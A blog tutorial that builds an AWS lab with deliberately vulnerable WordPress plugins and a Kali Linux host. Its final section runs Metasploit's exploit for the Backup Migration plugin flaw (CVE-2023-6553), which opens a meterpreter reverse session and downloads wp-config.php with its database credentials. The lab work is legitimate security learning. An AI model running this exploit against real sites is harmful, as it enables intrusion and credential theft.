---
title: Exploit vulnerability in a WordPress plugin with Kali Linux 2
author: Petr Ruzicka
date: 2024-05-09
description: Learn how to exploit a vulnerability in a WordPress plugin running on EC2 using Kali Linux
categories: [Security, Exploit, Vulnerability, Kali Linux, EC2, Docker, Amazon ECS]
tags:
  [
    EC2,
    docker,
    container,
    security,
    Kali Linux,
    exploit,
    vulnerability,
    WordPress,
    plugin,
    Amazon ECS,
  ]
image: https://media.githubusercontent.com/media/openutd/openutd.github.io/e006b3c723e203399f4099045e937e1ca820a7f7/slides/assets/kali_linux.png
---

For the educational purposes, it may be useful to learn how to exploit
a vulnerability in a WordPress plugin using Kali Linux.

I'm going to cover the following steps:

- Install Amazon ECS cluster and crete two EC2 instances  - standalone and with
  Docker
- Install vulnerable Wordpress Application to ECS, Docker and standalone EC2
  instance
- Create EC2 instance with Kali Linux (and install Metasploit there)
- Exploit vulnerability in a WordPress plugin using Kali Linux + Metasploit

## Set necessary environment variables and download CloudFormation templates

Requirements:

- [AWS CLI](https://aws.amazon.com/cli/)
- [Colima](https://github.com/abiosoft/colima) / [Docker](https://www.docker.com/)
  / [Rancher Desktop](https://rancherdesktop.io/) / ...
- [copilot](https://github.com/aws/copilot-cli)

Set the environment variables:

```bash
# export AWS_ACCESS_KEY_ID="xxxxxxxxxxxxxxxxxx"
# export AWS_SECRET_ACCESS_KEY="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
export AWS_REGION="eu-central-1"
AWS_EC2_KEY_PAIR_NAME="wordpress-test"
TMP_DIR="${TMP_DIR:-${PWD}}"
WORDPRESS_USERNAME="wordpress"
WORDPRESS_PASSWORD=$(openssl rand -base64 12)
MARIADB_WORDPRESS_DATABASE="wordpress"
MARIADB_WORDPRESS_DATABASE_USER="wordpress"
MARIADB_WORDPRESS_DATABASE_PASSWORD=$(openssl rand -base64 12)
MARIADB_ROOT_PASSWORD=$(openssl rand -base64 12)
```

Download the CloudFormation templates for VPC, Kali Linux, Ubuntu and
AmazonLinux-2023:

```bash
# renovate: currentValue=master
wget --continue -q -P "${TMP_DIR}" https://raw.githubusercontent.com/aws-samples/aws-codebuild-samples/00284b828a360aa89ac635a44d84c5a748af03d3/ci_tools/vpc_cloudformation_template.yml
# renovate:
wget --continue -q -P "${TMP_DIR}" https://raw.githubusercontent.com/aws-samples/amazon-ec2-nice-dcv-samples/3cb54467cf4c58bace2f949a704871f9bc0e5af5/cfn/KaliLinux-NICE-DCV.yaml
# renovate:
wget --continue -q -P "${TMP_DIR}" https://raw.githubusercontent.com/aws-samples/ec2-lamp-server/c2b64d97229a223dd5f5f38fd3f9660a8011f050/UbuntuLinux-2204-LAMP-server.yaml
# renovate:
wget --continue -q -P "${TMP_DIR}" https://raw.githubusercontent.com/aws-samples/ec2-lamp-server/c2b64d97229a223dd5f5f38fd3f9660a8011f050/AmazonLinux-2023-LAMP-server.yaml
```

Create a new AWS EC2 Key Pair to be used for the EC2 instances:

```bash
aws ec2 create-key-pair --key-name "${AWS_EC2_KEY_PAIR_NAME}" --key-type ed25519 --query "KeyMaterial" --output text > "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem"
chmod 600 "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem"
```

## Run Kali Linux on Amazon EC2 instance

![Kali Linux](https://user-images.githubusercontent.com/45159366/128566095-253303e2-25d8-42f1-a06d-0b38ca079a1a.png){:width="600"}

Create AWS EC2 instance with [Kali Linux](https://www.kali.org/) using the
CloudFormation template:

```bash
export SOLUTION_KALI="KaliLinux-NICE-DCV"

aws cloudformation deploy --capabilities CAPABILITY_IAM \
  --parameter-overrides "EnvironmentName=${SOLUTION_KALI}" \
  --stack-name "${SOLUTION_KALI}-VPC" --template-file "${TMP_DIR}/vpc_cloudformation_template.yml" \
  --tags "Owner=${USER} Environment=dev Solution=${SOLUTION_KALI}"

# shellcheck disable=SC2016
AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name "${SOLUTION_KALI}-VPC" --query 'Stacks[0].Outputs[? OutputKey==`PublicSubnet1` || OutputKey==`VPC`].{OutputKey:OutputKey,OutputValue:OutputValue}')
AWS_VPC_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".[] | select(.OutputKey==\"VPC\") .OutputValue")
AWS_SUBNET_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".[] | select(.OutputKey==\"PublicSubnet1\") .OutputValue")

eval aws cloudformation create-stack --capabilities CAPABILITY_AUTO_EXPAND CAPABILITY_IAM --on-failure DO_NOTHING \
  --parameters "ParameterKey=ec2KeyPair,ParameterValue=${AWS_EC2_KEY_PAIR_NAME} ParameterKey=vpcID,ParameterValue=${AWS_VPC_ID} ParameterKey=subnetID,ParameterValue=${AWS_SUBNET_ID} ParameterKey=allowWebServerPorts,ParameterValue=HTTP-and-HTTPS" \
  --stack-name "${SOLUTION_KALI}" --template-body "file://${TMP_DIR}/KaliLinux-NICE-DCV.yaml" \
  --tags "Key=Owner,Value=${USER} Key=Environment,Value=dev Key=Solution,Value=${SOLUTION_KALI}"
```

## Build EC2 instances with Wordpress Application

Let's look at the way to build EC2 instance with vulnerable Wordpress
Application.

### Create new EC2 instance with Wordpress in Container

Build new Ubuntu Linux 22.04 EC2 instance:

```bash
export SOLUTION_EC2_CONTAINER="Amazon-EC2-Container"

aws cloudformation deploy \
  --parameter-overrides "EnvironmentName=${SOLUTION_EC2_CONTAINER}" \
  --stack-name "${SOLUTION_EC2_CONTAINER}-VPC" --template-file "${TMP_DIR}/vpc_cloudformation_template.yml" \
  --tags "Owner=${USER} Environment=dev Solution=${SOLUTION_EC2_CONTAINER}"

# shellcheck disable=SC2016
AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name "${SOLUTION_EC2_CONTAINER}-VPC" --query 'Stacks[0].Outputs[? OutputKey==`PublicSubnet1` || OutputKey==`VPC`].{OutputKey:OutputKey,OutputValue:OutputValue}')
AWS_VPC_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".[] | select(.OutputKey==\"VPC\") .OutputValue")
AWS_SUBNET_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".[] | select(.OutputKey==\"PublicSubnet1\") .OutputValue")

eval aws cloudformation deploy --capabilities CAPABILITY_IAM \
  --parameter-overrides "instanceType=t4g.medium ec2Name=${SOLUTION_EC2_CONTAINER} ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME} vpcID=${AWS_VPC_ID} subnetID=${AWS_SUBNET_ID} webOption=none databaseOption=none phpVersion=none" \
  --stack-name "${SOLUTION_EC2_CONTAINER}" --template-file "${TMP_DIR}/AmazonLinux-2023-LAMP-server.yaml" \
  --tags "Owner=${USER} Environment=dev Solution=${SOLUTION_EC2_CONTAINER}"

AWS_EC2_CONTAINER_PUBLIC_IP=$(aws ec2 describe-instances --filters "Name=tag:Solution,Values=${SOLUTION_EC2_CONTAINER}" --query "Reservations[].Instances[].PublicIpAddress" --output text)
```

Install Docker and [Docker Compose](https://docs.docker.com/compose/):

```bash
ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}" << \EOF
set -euxo pipefail
sudo dnf install -qy docker
sudo usermod -aG docker ec2-user
sudo systemctl enable --now docker
sudo mkdir -p /usr/local/lib/docker/cli-plugins
sudo curl -sL https://github.com/docker/compose/releases/latest/download/docker-compose-linux-$(uname -m) -o /usr/local/lib/docker/cli-plugins/docker-compose
sudo chown root:root /usr/local/lib/docker/cli-plugins/docker-compose
sudo chmod +x /usr/local/lib/docker/cli-plugins/docker-compose
EOF
```

Install Wordpress in the container with vulnerable [WordPress Backup Migration Plugin](https://wordpress.org/plugins/backup-backup/)
plugin:

![Wordpress](https://user-images.githubusercontent.com/6468571/183256208-c68f8f50-d0fd-4dde-85ad-7e2ea828f78e.png){:width="400"}

```bash
# shellcheck disable=SC2087
ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}" << EOF2
set -euxo pipefail
mkdir -p docker-entrypoint-init.d
cat > docker-entrypoint-init.d/wordpress_plugin_install.sh << EOF
wp plugin install backup-backup --version=1.3.7 --activate
wp plugin install bulletproof-security --version=5.1 --activate
wp plugin install bookingpress-appointment-booking --version=1.0.10 --activate
EOF
chmod a+x docker-entrypoint-init.d/wordpress_plugin_install.sh

cat > docker-compose.yml << EOF
services:
  mariadb:
    # renovate: datasource=docker depName=bitnami/mariadb
    image: docker.io/bitnami/mariadb:11.2
    volumes:
      - 'mariadb_data:/bitnami/mariadb'
    environment:
      - ALLOW_EMPTY_PASSWORD=no
      - MARIADB_USER=${MARIADB_WORDPRESS_DATABASE_USER}
      - MARIADB_DATABASE=${MARIADB_WORDPRESS_DATABASE}
      - MARIADB_PASSWORD=${MARIADB_WORDPRESS_DATABASE_PASSWORD}
      - MARIADB_ROOT_PASSWORD=${MARIADB_ROOT_PASSWORD}
  wordpress:
    image: docker.io/bitnami/wordpress:6
    ports:
      - '80:8080'
      - '443:8443'
    volumes:
      - 'wordpress_data:/bitnami/wordpress'
      - '\${PWD}/docker-entrypoint-init.d:/docker-entrypoint-init.d'
    depends_on:
      - mariadb
    environment:
      - ALLOW_EMPTY_PASSWORD=no
      - WORDPRESS_USERNAME=${WORDPRESS_USERNAME}
      - WORDPRESS_PASSWORD=${WORDPRESS_PASSWORD}
      - WORDPRESS_DATABASE_HOST=mariadb
      - WORDPRESS_DATABASE_PORT_NUMBER=3306
      - WORDPRESS_DATABASE_USER=${MARIADB_WORDPRESS_DATABASE_USER}
      - WORDPRESS_DATABASE_PASSWORD=${MARIADB_WORDPRESS_DATABASE_PASSWORD}
      - WORDPRESS_DATABASE_NAME=${MARIADB_WORDPRESS_DATABASE}
volumes:
  mariadb_data:
    driver: local
  wordpress_data:
    driver: local
EOF

docker compose up --quiet-pull -d
EOF2
```

The vulnerable version of the [WordPress Backup Migration Plugin](https://www.rapid7.com/db/modules/exploit/multi/http/wp_backup_migration_php_filter/)
plugin in version `1.3.7` was installed.

Summarize the Wordpress URL, Admin URL, Username, and Password:

```shell
echo "WordPress URL: http://${AWS_EC2_CONTAINER_PUBLIC_IP}/"
echo "WordPress Admin URL: http://${AWS_EC2_CONTAINER_PUBLIC_IP}/admin"
echo "Username: ${MARIADB_WORDPRESS_USER}"
echo "Password: ${WORDPRESS_PASSWORD}"
```

```console
WordPress URL:
WordPress Admin URL:
Username: wordpress
Password: xxxxxxxxxxxxxxxx
```

### Create new EC2 instance with Wordpress

Build new Ubuntu Linux 22.04 EC2 instance:

```bash
export SOLUTION_EC2="Amazon-EC2"

aws cloudformation deploy \
  --parameter-overrides "EnvironmentName=${SOLUTION_EC2}" \
  --stack-name "${SOLUTION_EC2}-VPC" --template-file "${TMP_DIR}/vpc_cloudformation_template.yml" \
  --tags "Owner=${USER} Environment=dev Solution=${SOLUTION_EC2}"

# shellcheck disable=SC2016
AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name "${SOLUTION_EC2}-VPC" --query 'Stacks[0].Outputs[? OutputKey==`PublicSubnet1` || OutputKey==`VPC`].{OutputKey:OutputKey,OutputValue:OutputValue}')
AWS_VPC_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".[] | select(.OutputKey==\"VPC\") .OutputValue")
AWS_SUBNET_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".[] | select(.OutputKey==\"PublicSubnet1\") .OutputValue")

eval aws cloudformation deploy --capabilities CAPABILITY_IAM \
  --parameter-overrides "instanceType=t4g.medium ec2Name=${SOLUTION_EC2} ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME} vpcID=${AWS_VPC_ID} subnetID=${AWS_SUBNET_ID}" \
  --stack-name "${SOLUTION_EC2}" --template-file "${TMP_DIR}/AmazonLinux-2023-LAMP-server.yaml" \
  --tags "Owner=${USER} Environment=dev Solution=${SOLUTION_EC2}"

AWS_EC2_PUBLIC_IP=$(aws ec2 describe-instances --filters "Name=tag:Solution,Values=${SOLUTION_EC2}" --query "Reservations[].Instances[].PublicIpAddress" --output text)
```

Configure MariaDB and add `wordpress` user with password:

![MariaDB](https://raw.githubusercontent.com/openshift-integration/kamelet-catalog/2b1264daa55eea1ef4854bd39573d334831cfd27/docs/modules/ROOT/assets/images/kamelets/mariadb-source.svg)

```bash
# shellcheck disable=SC2087
ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_PUBLIC_IP}" << EOF2
sudo mysql --user=root << \EOF
UPDATE mysql.global_priv SET priv=json_set(priv, '$.plugin', 'mysql_native_password', '$.authentication_string', PASSWORD('${MARIADB_ROOT_PASSWORD}')) WHERE User='root';
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');
DELETE FROM mysql.global_priv WHERE User='';
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';
CREATE USER '${MARIADB_WORDPRESS_DATABASE_USER}'@'localhost' IDENTIFIED BY '${MARIADB_WORDPRESS_DATABASE_PASSWORD}';
GRANT ALL PRIVILEGES ON ${MARIADB_WORDPRESS_DATABASE}.* TO '${MARIADB_WORDPRESS_DATABASE_USER}'@'localhost';
FLUSH PRIVILEGES;
EOF
EOF2
```

Install Wordpress with vulnerable [WordPress Backup Migration Plugin](https://wordpress.org/plugins/backup-backup/)
plugin:

```bash
# shellcheck disable=SC2087
ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_PUBLIC_IP}" << EOF
set -euxo pipefail
wget -q https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
chmod +x wp-cli.phar
sudo mv wp-cli.phar /usr/local/bin/wp
cd /var/www/html/
wp core download --version=6.5.3
wp config create --dbname="${MARIADB_WORDPRESS_DATABASE}" --dbuser="${MARIADB_WORDPRESS_DATABASE_USER}" --dbpass="${MARIADB_WORDPRESS_DATABASE_PASSWORD}"
wp db create
wp core install --url="${AWS_EC2_PUBLIC_IP}" --title="My Blog" --admin_user="${WORDPRESS_USERNAME}" --admin_password="${WORDPRESS_PASSWORD}" --skip-email --admin_email="info@example.com"
wp plugin install backup-backup --version=1.3.7 --activate
wp plugin install bulletproof-security --version=5.1 --activate
wp plugin install bookingpress-appointment-booking --version=1.0.10 --activate
EOF
```

The vulnerable version of the [WordPress Backup Migration Plugin](https://www.rapid7.com/db/modules/exploit/multi/http/wp_backup_migration_php_filter/)
plugin in version `1.3.7` was installed.

Summarize the Wordpress URL, Admin URL, Username, and Password:

```shell
echo "WordPress URL: http://${AWS_EC2_PUBLIC_IP}/"
echo "WordPress Admin URL: http://${AWS_EC2_PUBLIC_IP}/wp-admin/"
echo "Username: ${WORDPRESS_USERNAME}"
echo "Password: ${WORDPRESS_PASSWORD}"
```

```console
WordPress URL:
WordPress Admin URL:
Username: wordpress
Password: xxxxxxxxxxxxxxxx
```

## Create ECS cluster with Wordpress

![Amazon ECS](https://raw.githubusercontent.com/cellinlab/logos/0557e31ed335e38f7fed1fb6c9081221fea7873d/logos/aws-ecs.svg){:width="150"}

Prepare the `wordpress_plugin_install.sh` startup script, which will be used to
install the [WordPress Backup Migration Plugin](https://wordpress.org/plugins/backup-backup/)
during the container startup:

```bash
cd "${TMP_DIR}" || exit
cat > wordpress_plugin_install.sh << EOF
wp plugin install backup-backup --version=1.3.7 --activate
wp plugin install bulletproof-security --version=5.1 --activate
wp plugin install bookingpress-appointment-booking --version=1.0.10 --activate
EOF
chmod a+x wordpress_plugin_install.sh
```

Create the `startup.sh` script, which will be used to populate the environment
variables for bitnami/wordpress based on the WORDPRESSCLUSTER_SECRET produced by
copilot:

```bash
cat > startup.sh << \EOF
#!/bin/sh

# Exit if the secret wasn't populated by the ECS agent
if [ -z "${WORDPRESSCLUSTER_SECRET}" ]; then
  echo "Environment variable "WORDPRESSCLUSTER_SECRET" with secrets is not populated in environment !!!"
  echo 'It should look like: {"host":"mariadb","port":3306,"dbname":"wordpress","username":"wordpress","password":"password"}'
  exit 1
fi

export WORDPRESS_DATABASE_HOST=$(echo "${WORDPRESSCLUSTER_SECRET}" | jq -r '.host')
export WORDPRESS_DATABASE_PORT_NUMBER=$(echo "${WORDPRESSCLUSTER_SECRET}" | jq -r '.port')
export WORDPRESS_DATABASE_NAME=$(echo "${WORDPRESSCLUSTER_SECRET}" | jq -r '.dbname')
export WORDPRESS_DATABASE_USER=$(echo "${WORDPRESSCLUSTER_SECRET}" | jq -r '.username')
export WORDPRESS_DATABASE_PASSWORD=$(echo "${WORDPRESSCLUSTER_SECRET}" | jq -r '.password')

/opt/bitnami/scripts/wordpress/entrypoint.sh /opt/bitnami/scripts/apache/run.sh
EOF
chmod a+x startup.sh
```

Prepare the `Dockerfile` which installs jq into the [Bitnami Wordpress image](https://github.com/bitnami/containers/tree/main/bitnami/wordpress)
ad uses the `startup.sh` script to start the container:

```bash
cat > Dockerfile << \EOF
FROM docker.io/bitnami/minideb:bookworm as installer
RUN set -eux && \
    apt-get update -q && \
    apt-get install curl -y -q && \
    curl -sLo /usr/local/bin/jq https://github.com/stedolan/jq/releases/download/jq-1.5/jq-linux64 && \
    chmod a+x /usr/local/bin/jq

FROM docker.io/bitnami/wordpress:latest as app
COPY --from=installer /usr/local/bin/jq /usr/bin/jq
COPY startup.sh /opt/copilot/scripts/startup.sh
COPY wordpress_plugin_install.sh /docker-entrypoint-init.d/

ENTRYPOINT ["/bin/sh", "-c"]
CMD ["/opt/copilot/scripts/startup.sh"]
EXPOSE 8080
EOF
```

Initialize the backend with Copilot:

![Copilot CLI](https://raw.githubusercontent.com/aws/copilot-cli/4a1498b4973366c0fde88c5922c61ee3b142855a/site/content/assets/images/copilot-logo-48-light.svg){:width="150"}

```bash
copilot app init wordpress --resource-tags "Owner=${USER},Environment=dev,Solution=Amazon-ECS"
```

Create a development environment:

```bash
copilot env init --name dev --default-config
```

Set up the required infrastructure to run our containerized application. It will
now proceed to create the VPC, Public Subnets, Private Subnets, Route53 Private
HostedZone for Service discovery, custom route table, Security Group for
containers to talk to each other, and an ECS Cluster to group the ECS services:

```bash
copilot env deploy --name dev
```

Create a Wordpress secrets in SecureString parameters in SSM Parameter Store:

```bash
copilot secret init --name WORDPRESS_USERNAME --values "dev=${WORDPRESS_USERNAME}" --overwrite
copilot secret init --name WORDPRESS_PASSWORD --values "dev=${WORDPRESS_PASSWORD}" --overwrite
```

Start the Docker Desktop or Colima in case you are the Mac User:

```shell
colima start
```

Create a manifest file which defines your backend service:

```bash
copilot svc init --dockerfile Dockerfile \
  --name wordpress --port 8080 --svc-type 'Load Balanced Web Service'
```

Add references to the secrets in the `copilot/wordpress/manifest.yml`:

```bash
cat >> copilot/wordpress/manifest.yml << EOF

secrets:
  WORDPRESS_USERNAME: /copilot/wordpress/dev/secrets/WORDPRESS_USERNAME
  WORDPRESS_PASSWORD: /copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD
EOF
```

Create a Aurora DB to be used by the backend service:

```bash
copilot storage init --name wordpress-cluster --lifecycle=workload \
  --storage-type Aurora --engine MySQL --initial-db "${MARIADB_WORDPRESS_DATABASE}"
```

Deploy the backend service to the development environment:

```bash
copilot svc deploy --resource-tags "Owner=${USER},Environment=dev,Solution=Amazon-ECS"
```

After deployment, check the status and logs:

```bash
copilot svc status
copilot svc logs --limit 1000
```

Get the the details of the service:

```bash
COPILOT_PUBLIC_IP=$(copilot svc show --name wordpress --json | jq -r '.routes[].url')
copilot svc show --name wordpress
```

```console
About

  Application  wordpress
  Name         wordpress
  Type         Load Balanced Web Service

Configurations

  Environment  Tasks     CPU (vCPU)  Memory (MiB)  Platform      Port
  -----------  -----     ----------  ------------  --------      ----
  dev          1         0.25        512           LINUX/X86_64  8080

Routes

  Environment  URL
  -----------  ---
  dev          http://wordpr-Publi-vYEvowOKtFoB-782908751.eu-central-1.elb.amazonaws.com

Internal Service Endpoints

  Endpoint                            Environment  Type
  --------                            -----------  ----
  wordpress:8080                      dev          Service Connect
  wordpress.dev.wordpress.local:8080  dev          Service Discovery

Variables

  Name                                Container  Environment  Value
  ----                                ---------  -----------  -----
  COPILOT_APPLICATION_NAME            wordpress  dev          wordpress
  COPILOT_ENVIRONMENT_NAME              "          "          dev
  COPILOT_LB_DNS                        "          "          wordpr-Publi-vYEvowOKtFoB-782908751.eu-central-1.elb.amazonaws.com
  COPILOT_SERVICE_DISCOVERY_ENDPOINT    "          "          dev.wordpress.local
  COPILOT_SERVICE_NAME                  "          "          wordpress
  WORDPRESSCLUSTER_SECURITY_GROUP       "          "          sg-0dff40761d2c461fe

Secrets

  Name                     Container  Environment  Value From
  ----                     ---------  -----------  ----------
  WORDPRESSCLUSTER_SECRET  wordpress  dev          arn:aws:secretsmanager:eu-central-1:729560437327:secret:wordpressclusterAuroraSecre-nIyIPY1HZMjY-NJTpUT
  WORDPRESS_PASSWORD         "          "          parameter//copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD
  WORDPRESS_USERNAME         "          "          parameter//copilot/wordpress/dev/secrets/WORDPRESS_USERNAME
```

Summarize the Wordpress URL, Admin URL, Username, and Password:

```shell
echo "WordPress URL: ${COPILOT_PUBLIC_IP}/"
echo "WordPress Admin URL: ${COPILOT_PUBLIC_IP}/wp-admin/"
echo "Username: ${WORDPRESS_USERNAME}"
echo "Password: ${WORDPRESS_PASSWORD}"
```

```console
WordPress URL: http://wordpr-Publi-LgDJWow2YyTA-458332216.eu-central-1.elb.amazonaws.com/
WordPress Admin URL: http://wordpr-Publi-LgDJWow2YyTA-458332216.eu-central-1.elb.amazonaws.com/wp-admin/
Username: wordpress
Password: xxxxxxxxxxxxxxxx
```

Handy links:

- [Build Efficient CI/CD Pipelines for Connected Microservices in Under an Hour Using AWS Copilot](https://community.aws/content/2djhTaf6woZwSQPAEt94ScYWWDv/ci-cd-pipelines-for-two-connected-services-using-aws-copilot?lang=en)
- [Wordpress on Copilot](https://github.com/bvtujo/copilot-wordpress)

## Attack the Wordpress Application

The following commands run the Metasploit Framework to exploit the
vulnerability in the [WordPress Backup Migration Plugin](https://wordpress.org/plugins/backup-backup/).

The details about the vulnerability can be found here:

- [WordPress Backup Migration Plugin PHP Filter Chain RCE](https://www.rapid7.com/db/modules/exploit/multi/http/wp_backup_migration_php_filter/)
- [Vulnerability Details : CVE-2023-6553](https://www.cvedetails.com/cve/CVE-2023-6553/)
- [CVE-2023-6553 Exploit V2](https://github.com/Chocapikk/CVE-2023-6553)
- [CVE-2023-6553 Detail](https://nvd.nist.gov/vuln/detail/CVE-2023-6553)

Login to the Kali Linux instance using SSH and perform the steps:

- Install Metasploit Framework
- Initialize the Metasploit Framework
- Use `wp_backup_migration_php_filter` exploit module to exploit the Wordpress
  plugin vulnerability
- Execute the `sysinfo` to get details about the remote system
- Download the Wordpress config file `wp-config.php` which contains database
  credentials

Allow my user to connect to Kali Linux instance using SSH and install Metasploit:

```bash
AWS_EC2_KALI_LINUX_PUBLIC_IP=$(aws ec2 describe-instances --filters "Name=tag:Solution,Values=${SOLUTION_KALI}" --query "Reservations[].Instances[].PublicIpAddress" --output text)
ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}" 'curl -Ls https://github.com/ruzickap.keys >> ~/.ssh/authorized_keys'
scp -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" "kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}":~
ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}" << EOF
sudo snap install metasploit-framework
msfdb init
EOF
```

![Metasploit](https://user-images.githubusercontent.com/63872951/187396388-1c15dd6e-95a0-438a-ada5-71e49ff17f4e.jpg){:width="500"}
_Metasploit logo_

Run Metasploit Framework and exploit the vulnerability in all three environments
(ECS, EC2 with Docker, and standalone EC2 instance):

```bash
echo "*** NOT WORKING FOR: ${AWS_EC2_PUBLIC_IP} ${AWS_EC2_CONTAINER_PUBLIC_IP}"
# shellcheck disable=SC2087
for PUBLIC_IP in ${COPILOT_PUBLIC_IP}; do
  ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}" << EOF2
cat << EOF | msfconsole --quiet --resource -
use exploit/multi/http/wp_backup_migration_php_filter
set rhost ${PUBLIC_IP}
set lhost ${AWS_EC2_KALI_LINUX_PUBLIC_IP}
set lport 443
run
sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo \
  --meterpreter-command "download /bitnami/wordpress/wp-config.php"
exit -y
EOF
EOF2
done
```

## Cleanup

Delete the Amazon EKS cluster, EC2 instances, VPCs, EC2 Key Pair, DB Snapshots,
SSM parameters and CloudWatch Log Groups:

```sh
export AWS_REGION="eu-central-1"
export AWS_EC2_KEY_PAIR_NAME="wordpress-test"
export SOLUTION_KALI="KaliLinux-NICE-DCV"
export SOLUTION_EC2_CONTAINER="Amazon-EC2-Container"
export SOLUTION_EC2="Amazon-EC2"

aws cloudformation delete-stack --stack-name "${SOLUTION_KALI}"
aws cloudformation delete-stack --stack-name "${SOLUTION_EC2_CONTAINER}"
aws cloudformation delete-stack --stack-name "${SOLUTION_EC2}"
aws cloudformation delete-stack --stack-name "${SOLUTION_KALI}-VPC"
aws cloudformation delete-stack --stack-name "${SOLUTION_EC2_CONTAINER}-VPC"
aws cloudformation delete-stack --stack-name "${SOLUTION_EC2}-VPC"
aws ec2 delete-key-pair --key-name "${AWS_EC2_KEY_PAIR_NAME}"
copilot app delete --name wordpress --yes
aws ssm delete-parameter --name /copilot/wordpress/dev/secrets/WORDPRESS_USERNAME
aws ssm delete-parameter --name /copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD
aws logs describe-log-groups --log-group-name-prefix /aws/lambda/wordpress-dev-wordpress --query 'logGroups[*].logGroupName' | jq -r '.[]' | xargs -I {} aws logs delete-log-group --log-group-name {}
aws rds describe-db-cluster-snapshots --query 'DBClusterSnapshots[?starts_with(DBClusterSnapshotIdentifier, `wordpress-dev-wordpress`) == `true`].DBClusterSnapshotIdentifier' | jq -r '.[]' | xargs -I {} aws rds delete-db-cluster-snapshot --db-cluster-snapshot-identifier {}
```

Enjoy ... 😉
